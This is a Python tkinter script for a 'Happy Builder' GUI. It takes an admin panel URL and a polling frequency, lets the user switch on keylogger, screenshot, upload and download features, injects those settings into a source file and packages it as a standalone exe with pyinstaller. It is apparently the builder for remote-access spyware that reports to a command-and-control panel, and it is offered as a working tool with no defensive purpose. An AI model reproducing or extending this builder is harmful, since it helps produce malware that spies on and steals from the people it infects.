import tkinter
from tkinter import *
# import os
import subprocess


class Builder:
    def __init__(self):
        self.master = tkinter.Tk()
        self.canvas = tkinter.Canvas(self.master, bg='black', height=500, width=650)
        self.master.title = 'Builder'
        self.master.resizable(False, False)
        self.var = IntVar()
        self.options = {
                'keylog': 'no',
                'screenshot': 'no',
                'exe': 'yes',
                'upload': 'no',
                'download': 'no',
                'notification': 'no'
            }
        self.loopCheck = True

        self.drawMenu()
        self.canvas.pack()
        self.master.mainloop()
   

    def drawMenu(self):
        self.canvas.create_text(150, 50, fill="white", font="Roboto 25 bold",
                                        text="Happy Builder")
        self.canvas.create_line(0, 95, 650, 95, fill='white')
        self.canvas.create_line(460, 95, 460, 500,  fill='white')


        self.canvas.create_text(150, 140, fill="white", font="Roboto 14", text="Enter your admin panel url:")
        self.entryLink = tkinter.Entry(self.master, width='40', font='Roboto 12')
        self.entryLink.place(x=24, y=165)


        self.canvas.create_text(195, 220, fill="white", font="Roboto 14", text="Enter update frequency (in seconds):")
        self.entryFrequency = tkinter.Entry(self.master, width='40', font='Roboto 12')
        self.entryFrequency.place(x=24, y=245)


        self.canvas.create_text(85, 300, fill="white", font="Roboto 14", text="Build exe file:")
        self.radioYes = tkinter.Button(self.master, text="Yes",command=lambda check='yes', radio='exe': self.toggleRadioBtn(check, radio), font='Roboto 12', background='green', cursor='hand2', activebackground='yellow')
        self.radioNo = tkinter.Button(self.master, text="No", command=lambda check='no', radio='exe': self.toggleRadioBtn(check, radio), font='Roboto 12', cursor='hand2', activebackground='yellow')
        self.radioYes.place(x=25, y=325)
        self.radioNo.place(x=100, y=325)

        self.canvas.create_text(85, 385, fill="white", font="Roboto 14", text="Features:")
        self.radioKeylogger = tkinter.Button(self.master, text="Keylogger",command=lambda check='toggle', radio='keylog': self.toggleRadioBtn(check, radio), font='Roboto 12', background='red', cursor='hand2', activebackground='yellow')
        self.radioScreenshot = tkinter.Button(self.master, text="Screenshot", command=lambda check='toggle', radio='screenshot': self.toggleRadioBtn(check, radio), font='Roboto 12', background='red', cursor='hand2', activebackground='yellow')
        self.radioNotification = tkinter.Button(self.master, text="Notifications", command=lambda check='toggle', radio='notification': self.toggleRadioBtn(check, radio), font='Roboto 12', background='red', cursor='hand2', activebackground='yellow')
        self.radioKeylogger.place(x=25, y=410)
        self.radioScreenshot.place(x=150, y=410)
        self.radioNotification.place(x=283, y=410)

        self.radioUpload = tkinter.Button(self.master, text="  Upload   ",command=lambda check='toggle', radio='upload': self.toggleRadioBtn(check, radio), font='Roboto 12', background='red', cursor='hand2', activebackground='yellow')
        self.radioDownload = tkinter.Button(self.master, text=" Download ", command=lambda check='toggle', radio='download': self.toggleRadioBtn(check, radio), font='Roboto 12', background='red', cursor='hand2', activebackground='yellow')
        self.radioUpload.place(x=25, y=455)
        self.radioDownload.place(x=150, y=455)

        self.canvas.create_text(555, 385, fill="white", font="Roboto 8", text="After clicking wait ~30 second.")

        self.submitButton = tkinter.Button(self.master, text="\n     Build!     \n",command=lambda data=self.options: self.buildApp(data), font='Roboto 15 bold', background='green', cursor='hand2', activebackground='yellow')
        self.submitButton.place(x=475, y=400)


    def buildApp(self, data):
        data['link'] = self.entryLink.get()
        data['freq'] = self.entryFrequency.get()

        
        file = open('./src/HappyFile.py','r')
        temp = '\n'.join(file.read().split('\n')[1:])
        file.close()

        file = open('./src/HappyFile.py', 'w')
        file.write(f"DATA = {data}\n")

        file.write(temp)
        file.close()

        # os.popen('./pyinstaller --onefile ./src/code.py')
        subprocess.run(["./pyinstaller", "--onefile", "./src/HappyFile.py"], shell=False, stdout=subprocess.PIPE)
        self.canvas.create_text(550, 150, fill="white", font="Roboto 14", text="Success", tag='building')
        self.canvas.create_text(560, 180, fill="white", font="Roboto 8", text="Generated file is in /dist/ folder.")



    def toggleRadioBtn(self, text, command):
        if command == 'exe':
            if text == 'yes':
                self.options['exe'] = 'yes'
                self.radioYes.configure(background='green')
                self.radioNo.configure(background='grey')
            else:
                self.options['exe'] = 'no'
                self.radioNo.configure(background='red')
                self.radioYes.configure(background='grey')
        elif command == 'keylog':
            if text == 'toggle':
                if self.options['keylog'] == 'no':
                    self.options['keylog'] = 'yes'
                    self.radioKeylogger.configure(background='green')
                else:
                    self.options['keylog'] = 'no'
                    self.radioKeylogger.configure(background='red')
        elif command == 'screenshot':
            if text == 'toggle':
                if self.options['screenshot'] == 'no':
                    self.options['screenshot'] = 'yes'
                    self.radioScreenshot.configure(background='green')
                else:
                    self.options['screenshot'] = 'no'
                    self.radioScreenshot.configure(background='red')
        elif command == 'notification':
            if text == 'toggle':
                if self.options['notification'] == 'no':
                    self.options['notification'] = 'yes'
                    self.radioNotification.configure(background='green')
                else:
                    self.options['notification'] = 'no'
                    self.radioNotification.configure(background='red')
        elif command == 'upload':
            if text == 'toggle':
                if self.options['upload'] == 'no':
                    self.options['upload'] = 'yes'
                    self.radioUpload.configure(background='green')
                else:
                    self.options['upload'] = 'no'
                    self.radioUpload.configure(background='red')
        elif command == 'download':
            if text == 'toggle':
                if self.options['download'] == 'no':
                    self.options['download'] = 'yes'
                    self.radioDownload.configure(background='green')
                else:
                    self.options['download'] = 'no'
                    self.radioDownload.configure(background='red')


game = Builder()

